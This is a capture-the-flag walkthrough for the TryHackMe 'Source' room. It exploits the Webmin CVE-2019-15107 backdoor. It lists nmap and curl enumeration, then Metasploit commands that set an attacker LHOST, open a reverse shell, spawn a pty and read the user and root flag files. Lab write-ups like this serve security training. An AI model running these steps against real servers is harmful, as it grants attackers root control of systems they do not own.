# [Source](https://tryhackme.com/room/source)

## Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

# Embark

## Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?

### user.txt

1. Start by performing initial network enumeration to identify open ports and running services on the target system

```bash
nmap <TARGET_IP>
```

[SCREEN01]

2. Examine the Webmin service to identify the specific version running

```bash
curl -k -I https://<TARGET_IP>:10000/
```

[SCREEN02]

3. Based on the enumeration results, research known vulnerabilities for the identified Webmin version. The CVE-2019-15107 backdoor vulnerability affects Webmin versions 1.882 through 1.921. Launch Metasploit and configure the exploit module. Once the exploit succeeds, navigate to the user directory and capture the first flag

```bash
msfconsole
search webmin
use exploit/linux/http/webmin_backdoor
show options
set LHOST <ATTACKER_IP>
set RHOSTS <TARGET_IP>
set RPORT 10000
set SSL true
exploit

whoami
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/dark/user.txt
```

[SCREEN04]

---

### root.txt

1. Access the root directory and retrieve the final flag

```bash
cat /root/root.txt
```

[SCREEN05]
